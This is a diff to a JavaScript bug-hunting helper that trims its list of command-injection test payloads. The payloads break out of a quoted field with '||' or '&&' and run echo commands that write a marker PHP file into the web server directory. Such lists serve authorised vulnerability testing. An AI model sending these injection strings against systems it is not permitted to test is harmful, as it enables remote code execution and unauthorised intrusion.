@@ -22,23 +22,8 @@ function JsBugHuntingHelper () {
     'echo "TEST_RCE" > /var/www/html/testRCE.php#',
     'test" || echo "TEST_RCE" > /var/www/testRCE.php#',
     'test" || echo "TEST_RCE" > /var/www/testRCE.php#',
-    'test" || echo "TEST_RCE" > /var/www/html/testRCE.php #',
-    'echo "TEST_RCE" > /var/www/html/testRCE.php #',
-    'test" || echo "TEST_RCE" > /var/www/testRCE.php #',
-    'test" || echo "TEST_RCE" > /var/www/testRCE.php  #',
-    'test" || echo "TEST_RCE" > /var/www/html/testRCE.php',
-    'echo "TEST_RCE" > /var/www/html/testRCE.php',
-    'test" || echo "TEST_RCE" > /var/www/testRCE.php',
-    'test" || echo "TEST_RCE" > /var/www/testRCE.php',
-    'test" || echo "TEST_RCE" > /var/www/html/testRCE.php || echo "',
-    'echo "TEST_RCE" > /var/www/html/testRCE.php || echo "',
-    'test" || echo "TEST_RCE" > /var/www/testRCE.php || echo "',
-    'test" || echo "TEST_RCE" > /var/www/testRCE.php || echo "',
-    'test" && echo "TEST_RCE" > /C/var/www/testRCE.php && echo "ciao',
-    '" || echo "TEST_RCE" #',
-    '" && echo "TEST_RCE" #',
-    '" || echo "TEST_RCE"',
-    '" && echo "TEST_RCE"'
+    '" || echo "TEST_RCE"#',
+    '" && echo "TEST_RCE"#'
   ]
 
   // eslint-disable-next-line no-multiple-empty-lines
